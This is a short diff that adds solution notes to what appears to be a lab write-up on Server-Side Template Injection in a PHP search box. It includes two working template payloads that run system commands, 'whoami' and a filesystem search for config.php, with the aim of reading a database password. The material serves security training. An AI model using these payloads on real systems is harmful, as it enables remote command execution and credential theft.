@@ -265,3 +265,9 @@ This lab contains a Server-Side Template Injection (SSTI) vulnerability in a PHP
 To complete the lab, exploit the SSTI vulnerability in the search box to access the contents of the config.php file.
 
 What is the database password in config.php?
+
+*first payload* ->
+: {{ ['whoami']|map('system')|join }}
+
+*find the config.php file*
+: {{ ['find / -type f -iname "config.php" -ls 2>/dev/null']|map('system')|join }}
